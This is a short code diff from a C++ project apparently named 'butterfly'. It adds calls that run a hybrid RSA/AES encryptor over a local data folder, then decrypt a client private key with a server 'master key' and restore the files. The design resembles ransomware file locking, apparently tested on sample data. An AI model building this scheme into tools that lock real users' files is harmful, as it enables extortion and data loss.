@@ -15,7 +15,14 @@ int main(int argc, char *argv[])
 
     LOG_INFO("Start application " << PROJECT_NAME << " with version " << arg._version);
 
+    std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
+    encryptor->startWithDir("/home/christian/projects/butterfly/bin/data");
+    sleep(5);
+    std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
+    std::string cprivate = decryptor->decryptCPrivateRSA("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem");
+    decryptor->startWithDir("/home/christian/projects/butterfly/bin/data");
 
+    /*
     std::unique_ptr<butterfly::AESKeyDatabase> _database(new butterfly::AESKeyDatabase("AES.db", false));
 
     _database->print();
@@ -23,20 +30,22 @@ int main(int argc, char *argv[])
 
     _database->getEntry("/home/christian/");
 
-    //std::shared_ptr<butterfly::DirectoryIterator> dirIterator(new butterfly::DirectoryIterator());
-
+    std::shared_ptr<butterfly::DirectoryIterator> dirIterator(new butterfly::DirectoryIterator());
+    dirIterator->getAllFiles("/home/christian/");
+     */
     /*
     /////// Hybrid Part ////////
 
     // start encryption
     std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
+
     encryptor->encryptCPrivateRSA();
     encryptor->encryptFileWithAES("/home/christian/projects/butterfly/bin/data/test.pdf");
 
     encryptor->encryptAESKeyFile("AESKey.txt");
 
 
-    sleep(5);
+    sleep(10);
 
     // start decryption
     std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
